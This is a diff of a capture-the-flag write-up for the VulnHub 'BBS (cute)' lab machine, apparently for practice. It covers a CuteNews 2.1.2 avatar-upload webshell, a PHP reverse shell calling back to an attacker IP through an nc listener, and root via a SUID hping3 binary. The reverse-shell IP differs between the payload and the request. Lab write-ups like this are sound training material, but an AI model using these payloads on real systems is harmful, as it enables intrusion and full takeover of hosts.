@@ -7,6 +7,7 @@ author: H4
 [Details](https://www.vulnhub.com/entry/bbs-cute-102,567/)
 ## discovery
 ### portscan
+Starting with a simple port scan to identify the attack surface.
 ```bash
 $ nmap -Pn 192.168.55.128
 ```
@@ -17,16 +18,16 @@ $ nmap -Pn 192.168.55.128
 - 995 (pop3)
 
 ### web application
-- use some kind of dirbuster like gobuster or dirb to identify the `index.php`
-- cutenews 2.1.2 is installed on the target
+Use some kind of dir busting tool like gobuster or dirb to identify the `index.php`  
+Cutenews 2.1.2 is installed on the target.
 
 ---
 
 ## exploitation
 ```cutenews 2.1.2 is vulnerable to an rce via file upload (https://www.exploit-db.com/exploits/48800)```
 
-- register a new account
-- perform an avatar upload to upload a shell
+1. register a new account
+2. perform an avatar upload to upload a shell
 
 ```http
 POST /index.php HTTP/1.1
@@ -90,6 +91,8 @@ Content-Disposition: form-data; name="more[about]"
 
 ```
 
+The Server responds with a `200` message, which might be a good indication that everything worked as expected.
+
 ```http
 HTTP/1.1 200 OK
 Date: Thu, 20 Jan 2022 20:47:07 GMT
@@ -111,7 +114,7 @@ Content-Type: text/html; charset=UTF-8
 ...
 ```
 
-- execute commands
+Test command execution.
 
 ```http
 GET /uploads/avatar_hacker_shell.php?cmd=whoami HTTP/1.1
@@ -136,12 +139,22 @@ Content-Type: text/html; charset=UTF-8
 GIF8;\nwww-data
 ```
 
+It worked!
+
 ---
 
 ## post exploitation
 ### get reverse shell
+We are using a simple `PHP` based reverse shell here.  
 payload: ```php -r '$sock=fsockopen("192.168.49.89",443);exec("/bin/sh -i <&3 >&3 2>&3");'```
-#### request 
+
+#### start listener on the attacking machine
+```bash
+$ nc -lvp 443
+listening on [any] 443 ...
+```
+
+#### trigger reverse shell
 ```http
 GET /uploads/avatar_hacker_shell.php?cmd=php+-r+'$sock%3dfsockopen("192.168.49.55",443)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
 Host: 192.168.55.128
@@ -154,7 +167,7 @@ Cookie: CUTENEWS_SESSION=qujdjltcojbtb3glgfsc3guqum
 Connection: close
 ````
 
-#### listener
+#### catch connect from target
 ```bash
 $ nc -lvp 443
 listening on [any] 443 ...
@@ -174,18 +187,22 @@ $ cat local.txt
 ```
 -> ```13e7c6be29c*********413f552260ec```
 
-### priv esc
-look for SUID binaries
+### privilege escalation
+Looking for SUID binaries.
 ```bash
 $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ...
 -rwsr-sr-x 1 root root 156808 Sep  6  2014 /usr/sbin/hping3
 ...
+```
+Looking on [gtfobins](https://gtfobins.github.io/) on how to exploit `hping3` to get root access
+
 $ /usr/sbin/hping3
 hping3> /bin/sh -p
 # whoami
 root
 ```
+We got root!
 
 ### get second flag
 ```bash
